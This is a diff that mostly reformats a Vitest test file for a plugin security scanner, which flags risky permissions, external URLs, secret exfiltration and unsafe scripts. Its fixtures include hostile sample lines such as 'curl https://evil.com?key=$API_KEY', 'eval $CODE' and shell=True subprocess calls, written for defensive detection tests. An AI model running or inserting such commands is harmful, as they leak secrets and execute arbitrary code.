@@ -1,13 +1,13 @@
-import { describe, it, expect } from "vitest";
-import { scanPlugin } from "../src/security/scanner.js";
+import { describe, expect, it } from "vitest";
 import {
-  detectExternalUrls,
-  detectEnvVarExfiltration,
   detectBroadFilesystemAccess,
-  detectSuspiciousScripts,
+  detectEnvVarExfiltration,
+  detectExternalUrls,
   detectNetworkAccess,
+  detectSuspiciousScripts,
   runSecurityRules,
 } from "../src/security/rules.js";
+import { scanPlugin } from "../src/security/scanner.js";
 import { MockFsProvider } from "./helpers/mock-fs.js";
 
 describe("scanPlugin", () => {
@@ -51,7 +51,7 @@ describe("scanPlugin", () => {
         requires: {
           permissions: {
             paths: {
-              writable: ["/"],  // Critical: root write access
+              writable: ["/"], // Critical: root write access
             },
           },
         },
@@ -77,7 +77,7 @@ describe("scanPlugin", () => {
         requires: {
           permissions: {
             paths: {
-              writable: ["./data/**"],  // Warning: broad recursive access
+              writable: ["./data/**"], // Warning: broad recursive access
             },
           },
         },
@@ -123,9 +123,7 @@ describe("scanPlugin", () => {
 
     expect(reportWithInfo.info_count).toBeGreaterThan(0);
     expect(reportWithoutInfo.info_count).toBe(0);
-    expect(reportWithInfo.findings.length).toBeGreaterThan(
-      reportWithoutInfo.findings.length,
-    );
+    expect(reportWithInfo.findings.length).toBeGreaterThan(reportWithoutInfo.findings.length);
   });
 
   it("scans multiple directories and file types", async () => {
@@ -208,9 +206,7 @@ describe("scanPlugin", () => {
     expect(report.critical_count).toBeGreaterThan(0);
     expect(
       report.findings.some(
-        (f) =>
-          f.category === "permission_request" &&
-          f.message.includes("sensitive path"),
+        (f) => f.category === "permission_request" && f.message.includes("sensitive path"),
       ),
     ).toBe(true);
   });
@@ -237,8 +233,7 @@ describe("scanPlugin", () => {
 
     const broadAccessWarning = report.findings.find(
       (f) =>
-        f.category === "permission_request" &&
-        f.message.includes("broad recursive write access"),
+        f.category === "permission_request" && f.message.includes("broad recursive write access"),
     );
 
     expect(broadAccessWarning).toBeDefined();
@@ -279,7 +274,7 @@ describe("detectExternalUrls", () => {
     const context = {
       pluginName: "test",
       filePath: "script.sh",
-      content: 'curl https://api.example.org/data\nwget http://files.example.net/file',
+      content: "curl https://api.example.org/data\nwget http://files.example.net/file",
     };
 
     const result = detectExternalUrls(context);
@@ -296,8 +291,7 @@ describe("detectExternalUrls", () => {
     const context = {
       pluginName: "test",
       filePath: "script.sh",
-      content:
-        "https://github.com/user/repo\nhttps://example.com\nhttp://localhost:3000",
+      content: "https://github.com/user/repo\nhttps://example.com\nhttp://localhost:3000",
     };
 
     const result = detectExternalUrls(context);
@@ -381,14 +375,12 @@ describe("detectEnvVarExfiltration", () => {
     const context = {
       pluginName: "test",
       filePath: "script.sh",
-      content: 'curl https://evil.com?key=$API_KEY',
+      content: "curl https://evil.com?key=$API_KEY",
     };
 
     const result = detectEnvVarExfiltration(context);
 
-    const exfiltrationFinding = result.findings.find((f) =>
-      f.message.includes("exfiltration"),
-    );
+    const exfiltrationFinding = result.findings.find((f) => f.message.includes("exfiltration"));
 
     expect(exfiltrationFinding).toBeDefined();
     expect(exfiltrationFinding?.severity).toBe("critical");
@@ -457,7 +449,7 @@ describe("detectSuspiciousScripts", () => {
     const context = {
       pluginName: "test",
       filePath: "scripts/bad.js",
-      content: 'eval(userInput);',
+      content: "eval(userInput);",
     };
 
     const result = detectSuspiciousScripts(context);
@@ -483,7 +475,7 @@ describe("detectSuspiciousScripts", () => {
     const context = {
       pluginName: "test",
       filePath: "scripts/shell.py",
-      content: 'subprocess.call(cmd, shell=True)',
+      content: "subprocess.call(cmd, shell=True)",
     };
 
     const result = detectSuspiciousScripts(context);
@@ -594,7 +586,7 @@ describe("runSecurityRules", () => {
     const context = {
       pluginName: "test",
       filePath: "script.sh",
-      content: 'curl https://evil.com\neval $CODE',
+      content: "curl https://evil.com\neval $CODE",
     };
 
     const findings = runSecurityRules(context, [detectExternalUrls]);
